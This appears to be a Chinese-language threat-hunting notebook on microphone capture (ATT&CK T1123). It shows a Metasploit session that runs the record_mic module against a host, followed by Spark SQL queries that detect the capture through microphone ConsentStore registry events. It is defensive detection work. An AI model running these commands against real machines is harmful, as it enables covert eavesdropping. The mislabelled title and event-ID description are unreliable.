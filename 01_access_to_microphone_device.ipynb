{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "kernelspec": {
      "display_name": "Python 3",
      "language": "python",
      "name": "python3"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.8.5"
    },
    "colab": {
      "name": "01-access_to_microphone_device.ipynb",
      "provenance": []
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "tsqtna762Avb"
      },
      "source": [
        "# SMB远程文件创建（SMB Create Remote File）"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "pNNtnIiQ2Avp"
      },
      "source": [
        "## 概述"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "TPC4Wjb_2Avs"
      },
      "source": [
        "| 编写作者 | 攻击矩阵 | 创建时间 | 修改时间 |\n",
        "| ---- | ---- | ---- | ---- |\n",
        "| G4rb3n | T1123 | 2021-4-8 | 2021-4-8 |"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "8-I-fl1r2Avt"
      },
      "source": [
        "## 攻击场景"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "zhOc9X9E2Avt"
      },
      "source": [
        "黑客通过访问注册表键值来查看麦克风信息。"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "VyJUwjzu2Avt"
      },
      "source": [
        "## 攻击模拟"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "y8q82T2D5ytV"
      },
      "source": [
        "msf5 exploit(multi/handler) > use post/multi/manage/record_mic\n",
        "msf5 post(multi/manage/record_mic) > set SESSION 2\n",
        "SESSION => 2\n",
        "msf5 post(multi/manage/record_mic) > info\n",
        "\n",
        "      Name: Multi Manage Record Microphone\n",
        "    Module: post/multi/manage/record_mic\n",
        "  Platform: Linux, OSX, Windows\n",
        "      Arch: \n",
        "      Rank: Normal\n",
        "\n",
        "Provided by:\n",
        "  sinn3r <sinn3r@metasploit.com>\n",
        "\n",
        "Compatible session types:\n",
        "  Meterpreter\n",
        "\n",
        "Basic options:\n",
        "  Name      Current Setting  Required  Description\n",
        "  ----      ---------------  --------  -----------\n",
        "  DURATION  5                no        Number of seconds to record\n",
        "  SESSION   2                yes       The session to run this module on.\n",
        "\n",
        "Description:\n",
        "  This module will enable and record your target's microphone. For \n",
        "  non-Windows targets, please use Java meterpreter to be able to use \n",
        "  this feature.\n",
        "\n",
        "msf5 post(multi/manage/record_mic) > run\n",
        "\n",
        "[*] 172.18.39.6 - 20%...\n",
        "[*] 172.18.39.6 - 40%...\n",
        "[*] 172.18.39.6 - 60%...\n",
        "[*] 172.18.39.6 - 80%...\n",
        "[*] 172.18.39.6 - 100%...\n",
        "[*] 172.18.39.6 - Audio size: (55169 bytes)\n",
        "[+] 172.18.39.6 - Audio recording saved: /home/msf/.msf4/loot/20200610025201_default_172.18.39.6_172.18.39.6.audi_358712.wav\n",
        "[*] Post module execution completed\n",
        "msf5 post(multi/manage/record_mic) >"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "seHAkm-K2Avu"
      },
      "source": [
        "## 威胁狩猎"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "wO0el-Nx2Avv"
      },
      "source": [
        "### 狩猎原理"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "o9uud_pI2Avv"
      },
      "source": [
        "监控注册表项键值：HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged，来判断什么应用可能访问了麦克风。"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "IgLvOE222Avv"
      },
      "source": [
        "### 初始化分析引擎"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "cbvDmb8s2Avv"
      },
      "source": [
        "from openhunt.mordorutils import *\n",
        "spark = get_spark()"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "WGM_lecA2Avw"
      },
      "source": [
        "### 下载&加载Mordor日志集"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "5dgOvkaA2Avw",
        "outputId": "459b00d7-b211-44eb-8f3b-ead89ac593e9"
      },
      "source": [
        "mordor_file = \"https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/collection/host/msf_record_mic.zip\"\n",
        "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "[+] Processing a Spark DataFrame..\n",
            "[+] DataFrame Returned !\n",
            "[+] Temporary SparkSQL View: mordorTable \n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "UUwC0F4X2Avx"
      },
      "source": [
        "### 日志集统计"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "gMwIzpUM2Avx",
        "outputId": "0d3b5a66-f609-44ab-91a4-7bccfd849745"
      },
      "source": [
        "df = spark.sql(\n",
        "'''\n",
        "SELECT Hostname,Channel,EventID, Count(*) as count\n",
        "FROM mordorTable\n",
        "GROUP BY Hostname,Channel,EventID\n",
        "ORDER BY count DESC\n",
        "'''\n",
        ")\n",
        "df.show(truncate=False)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "+-------------------------+------------------------------------+-------+-----+\n",
            "|Hostname                 |Channel                             |EventID|count|\n",
            "+-------------------------+------------------------------------+-------+-----+\n",
            "|WORKSTATION6.mordor.local|Microsoft-Windows-Sysmon/Operational|12     |1635 |\n",
            "|WORKSTATION6.mordor.local|Microsoft-Windows-Sysmon/Operational|10     |1464 |\n",
            "|WORKSTATION6.mordor.local|Microsoft-Windows-Sysmon/Operational|13     |605  |\n",
            "|WORKSTATION5.mordor.local|Microsoft-Windows-Sysmon/Operational|10     |404  |\n",
            "|WORKSTATION6.mordor.local|Microsoft-Windows-Sysmon/Operational|7      |303  |\n",
            "|MORDORDC.mordor.local    |Microsoft-Windows-Sysmon/Operational|7      |277  |\n",
            "|MORDORDC.mordor.local    |Microsoft-Windows-Sysmon/Operational|12     |157  |\n",
            "|WORKSTATION5.mordor.local|Microsoft-Windows-Sysmon/Operational|13     |145  |\n",
            "|MORDORDC.mordor.local    |Security                            |4703   |119  |\n",
            "|MORDORDC.mordor.local    |Security                            |5447   |96   |\n",
            "|WORKSTATION6.mordor.local|Microsoft-Windows-Sysmon/Operational|23     |87   |\n",
            "|MORDORDC.mordor.local    |Security                            |5156   |74   |\n",
            "|MORDORDC.mordor.local    |Security                            |4658   |74   |\n",
            "|WORKSTATION6.mordor.local|Microsoft-Windows-Sysmon/Operational|11     |63   |\n",
            "|MORDORDC.mordor.local    |Microsoft-Windows-Sysmon/Operational|10     |61   |\n",
            "|MORDORDC.mordor.local    |Microsoft-Windows-Sysmon/Operational|13     |56   |\n",
            "|MORDORDC.mordor.local    |Security                            |5158   |41   |\n",
            "|WORKSTATION6.mordor.local|Security                            |5156   |39   |\n",
            "|MORDORDC.mordor.local    |Microsoft-Windows-Sysmon/Operational|3      |36   |\n",
            "|WORKSTATION5.mordor.local|Security                            |5156   |30   |\n",
            "+-------------------------+------------------------------------+-------+-----+\n",
            "only showing top 20 rows\n",
            "\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Wy9fAn2l2Avx"
      },
      "source": [
        "### 使用规则匹配攻击事件"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "TkRNE8in2Avx"
      },
      "source": [
        "### 规则 I"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "vNHSkDq82Avy"
      },
      "source": [
        "```\n",
        "—————————————————————————————————————————————————————————————————————————————————\n",
        "|        日志类型         |    日志来源    |          行为场景         |   事件ID  |\n",
        "---------------------------------------------------------------------------------\n",
        "|        Registry         |    security   |   进程/用户访问了注册表项  |   4663   |\n",
        "---------------------------------------------------------------------------------\n",
        "|        Registry         |    security   |  进程/用户请求访问注册表项 |   4656   |\n",
        "---------------------------------------------------------------------------------\n",
        "|        Registry         |    security   |   进程/用户修改了注册表项  |   4657   |\n",
        "—————————————————————————————————————————————————————————————————————————————————\n",
        "```"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "2WbcI8rj2Avy"
      },
      "source": [
        "筛选事件ID为5140（User accessed file share）的security事件。"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "s-wYaFYT2Avy",
        "outputId": "bd6e155a-26ed-4164-963f-b8960e9279ba"
      },
      "source": [
        "df = spark.sql(\n",
        "'''\n",
        "SELECT `@timestamp`, EventID, ObjectName\n",
        "FROM mordorTable\n",
        "WHERE LOWER(Channel) = 'security'\n",
        "  AND EventID IN (4656,4663,4657)\n",
        "  AND LOWER(ObjectName) RLIKE '.*consentstore\\\\\\\\\\\\\\microphone.*'\n",
        "'''\n",
        ")\n",
        "df.show(10, False)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "+------------------------+-------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\n",
            "|@timestamp              |EventID|ObjectName                                                                                                                                                                       |\n",
            "+------------------------+-------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\n",
            "|2020-06-10T02:51:56.437Z|4656   |\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#System32#WindowsPowerShell#v1.0#powershell.exe|\n",
            "|2020-06-10T02:51:56.437Z|4663   |\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#System32#WindowsPowerShell#v1.0#powershell.exe|\n",
            "|2020-06-10T02:51:57.435Z|4657   |\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#System32#WindowsPowerShell#v1.0#powershell.exe|\n",
            "|2020-06-10T02:52:01.459Z|4656   |\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#System32#WindowsPowerShell#v1.0#powershell.exe|\n",
            "|2020-06-10T02:52:01.460Z|4663   |\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#System32#WindowsPowerShell#v1.0#powershell.exe|\n",
            "|2020-06-10T02:52:01.461Z|4657   |\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#System32#WindowsPowerShell#v1.0#powershell.exe|\n",
            "+------------------------+-------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\n",
            "\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "K65xb-X_2Avy"
      },
      "source": [
        "## 规则II"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "P50Ce4H-2Avz"
      },
      "source": [
        "```\n",
        "—————————————————————————————————————————————————————————————————————————————————\n",
        "|        Registry         |     sysmon    |      进程创建注册表键值    |    12    |\n",
        "---------------------------------------------------------------------------------\n",
        "|        Registry         |     sysmon    |      进程创建注册表键值    |    13    |\n",
        "---------------------------------------------------------------------------------\n",
        "|        Registry         |     sysmon    |      进程创建注册表键值    |    14    |\n",
        "—————————————————————————————————————————————————————————————————————————————————\n",
        "```"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "NE4sWiFC2Avz",
        "outputId": "c1f07c83-8d00-4656-dbdc-4078d02addf2"
      },
      "source": [
        "df = spark.sql(\n",
        "'''\n",
        "SELECT `@timestamp`, EventID, TargetObject\n",
        "FROM mordorTable\n",
        "WHERE Channel = 'Microsoft-Windows-Sysmon/Operational'\n",
        "  AND EventID IN (12,13,14)\n",
        "  AND LOWER(TargetObject) RLIKE '.*consentstore\\\\\\\\\\\\\\microphone.*'\n",
        "'''\n",
        ")\n",
        "df.show(10,False)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "+------------------------+-------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\n",
            "|@timestamp              |EventID|TargetObject                                                                                                                                                                          |\n",
            "+------------------------+-------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\n",
            "|2020-06-10T02:51:55.390Z|12     |HKU\\S-1-5-21-526538150-889687948-186688817-1106\\Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged                                 |\n",
            "|2020-06-10T02:51:55.390Z|13     |HKU\\S-1-5-21-526538150-889687948-186688817-1106\\Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\Value                           |\n",
            "|2020-06-10T02:51:56.427Z|12     |HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone                                                                                        |\n",
            "|2020-06-10T02:51:56.427Z|12     |HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged                                                                            |\n",
            "|2020-06-10T02:51:56.427Z|12     |HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#System32#WindowsPowerShell#v1.0#powershell.exe                  |\n",
            "|2020-06-10T02:51:56.428Z|13     |HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#System32#WindowsPowerShell#v1.0#powershell.exe\\LastUsedTimeStart|\n",
            "|2020-06-10T02:51:56.428Z|12     |HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#System32#WindowsPowerShell#v1.0#powershell.exe                  |\n",
            "|2020-06-10T02:51:56.428Z|13     |HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#System32#WindowsPowerShell#v1.0#powershell.exe\\LastUsedTimeStop |\n",
            "|2020-06-10T02:52:02.482Z|12     |HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#System32#WindowsPowerShell#v1.0#powershell.exe                  |\n",
            "|2020-06-10T02:52:03.488Z|13     |HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#System32#WindowsPowerShell#v1.0#powershell.exe\\LastUsedTimeStop |\n",
            "+------------------------+-------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\n",
            "\n"
          ],
          "name": "stdout"
        }
      ]
    }
  ]
}